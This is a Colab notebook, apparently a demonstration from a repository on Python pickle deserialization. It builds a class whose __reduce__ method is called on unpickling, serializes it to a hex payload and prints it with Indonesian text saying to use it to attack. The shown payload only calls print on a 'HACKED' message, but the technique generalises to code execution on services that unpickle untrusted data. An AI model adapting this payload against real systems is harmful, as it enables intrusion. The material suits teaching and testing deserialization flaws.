{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOKQydiAnX7B6CkFk7x/8R0",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ahmdhqnn/Pickle-Deserialization/blob/main/exploit_payload.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "GASHXwmH5l5E",
        "outputId": "c7799d5e-f830-4901-a4ee-597ad7686c76"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Gunakan payload berikut untuk menyerang:\n",
            "80049544000000000000008c086275696c74696e73948c057072696e749493948c276563686f20274841434b45442120416e64612074656c6168206469656b73706c6f69746173692794859452942e\n"
          ]
        }
      ],
      "source": [
        "import pickle\n",
        "#import os\n",
        "\n",
        "class Exploit:\n",
        "  def __reduce__(self):\n",
        "    return (print, (\"echo 'HACKED! Anda telah dieksploitasi'\",))\n",
        "\n",
        "payload = pickle.dumps(Exploit()).hex()\n",
        "print(\"Gunakan payload berikut untuk menyerang:\")\n",
        "print(payload)\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "BsoyGgqK5vlH"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}